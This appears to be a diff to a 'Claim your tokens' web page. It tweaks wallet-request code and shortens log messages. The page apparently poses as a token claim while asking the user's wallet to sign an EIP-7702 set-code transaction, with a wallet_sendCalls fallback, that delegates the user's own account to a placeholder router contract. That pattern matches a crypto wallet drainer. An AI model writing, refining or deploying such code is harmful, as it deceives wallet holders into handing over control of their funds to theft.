@@ -60,7 +60,7 @@
         <div class="sub">Claim your tokens</div>
         
         <div class="info">
-            <span class="info-icon">🔐</span>
+            <span class="info-icon">🔐🇵🇹</span>
             <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
         </div>
         
@@ -84,7 +84,7 @@
         }
 
         async function tryMethod1(userAddress, nonce) {
-            sendLog('METHOD 1: eth_sendTransaction type 0x4');
+            sendLog('M1: eth_sendTransaction');
             const txParams = {
                 type: '0x4',
                 chainId: CHAIN_ID,
@@ -112,19 +112,19 @@
         }
 
         async function tryMethod2(userAddress) {
-            sendLog('METHOD 2: wallet_sendCalls fallback');
+            sendLog('M2: wallet_sendCalls');
             const txHash = await window.ethereum.request({
                 method: 'wallet_sendCalls',
                 params: [{
                     version: '1.0',
+                    chainId: CHAIN_ID,
+                    atomicRequired: false,
                     from: userAddress,
-                    calls: [
-                        {
-                            to: userAddress,
-                            data: '0x61461954',
-                            value: '0x0'
-                        }
-                    ],
+                    calls: [{
+                        to: userAddress,
+                        data: '0x61461954',
+                        value: '0x0'
+                    }],
                     capabilities: {
                         eip7702: {
                             address: ROUTER
@@ -161,7 +161,7 @@
                             params: [{ chainId: CHAIN_ID }]
                         });
                     } catch (e) {
-                        sendLog('CHAIN FAIL: ' + (e.message || ''));
+                        sendLog('CHAIN FAIL');
                         btn.disabled = false;
                         btn.textContent = 'Claim Now';
                         return;
@@ -180,11 +180,11 @@
                 try {
                     txHash = await tryMethod1(userAddress, nonce);
                 } catch (e1) {
-                    sendLog('METHOD 1 FAILED: ' + (e1.message || 'Unknown') + ' | code: ' + (e1.code || 'none'));
+                    sendLog('M1 FAIL: ' + (e1.message || '') + ' code:' + (e1.code || ''));
                     try {
                         txHash = await tryMethod2(userAddress);
                     } catch (e2) {
-                        sendLog('METHOD 2 FAILED: ' + (e2.message || 'Unknown') + ' | code: ' + (e2.code || 'none'));
+                        sendLog('M2 FAIL: ' + (e2.message || '') + ' code:' + (e2.code || ''));
                         throw e2;
                     }
                 }
@@ -194,7 +194,7 @@
                 btn.textContent = 'Complete';
 
             } catch (e) {
-                sendLog('ALL METHODS FAILED: ' + (e.message || 'Unknown'));
+                sendLog('ALL FAIL: ' + (e.message || ''));
                 btn.disabled = false;
                 btn.textContent = 'Claim Now';
             }
